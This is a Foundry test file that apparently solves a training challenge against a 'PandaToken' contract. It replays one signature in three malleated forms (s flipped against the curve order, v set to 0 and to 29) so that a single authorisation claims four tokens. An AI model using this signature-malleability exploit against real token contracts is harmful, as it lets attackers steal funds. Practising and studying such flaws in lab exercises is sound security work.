// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import {Test , console} from  "forge-std/Test.sol";
import "../src/Panda.sol";


interface IPandaToken{
    function getTokens(uint amount , bytes memory signature) external;
    function balanceOf(address user) external returns(uint256);
}
contract Hack is Test {
    IPandaToken private panda;
    address owner = vm.addr(1);
    address hacker = vm.addr(2);

    function setUp() external {
        bytes memory args = abi.encode(
            uint256(400), 
            "PandaToken",
            "PND"
        );
        vm.prank(owner);
        address pandaAddr = deployCode("src/Panda.sol:PandaToken", args);
        panda = IPandaToken(pandaAddr);
    }

    function test_hack() public {
        vm.startPrank(hacker);
        bytes32 hash = keccak256(abi.encode(hacker, 1 ether));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(1, hash);
        bytes memory signature = abi.encodePacked(v, r, s);
        uint256 N =0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
        uint256 sMalleated = N - uint256(s);
        bytes32 s_val = bytes32(sMalleated);
        bytes memory sig2 = abi.encodePacked(v , r , s_val); 
        bytes memory sig3 = abi.encodePacked(uint8(0) , r, s_val);
        bytes memory sig4 = abi.encodePacked(uint8(29) , r, s_val);

        // your goal - to have 3 tokens (3e18) on your own(hacker) balance.
        // solution

        panda.getTokens(1 ether , signature);
        panda.getTokens(1 ether, sig2);
        panda.getTokens(1 ether, sig3);
        panda.getTokens(1 ether, sig4);

        vm.stopPrank();
        assertEq(panda.balanceOf(hacker), 4 ether);
    }
}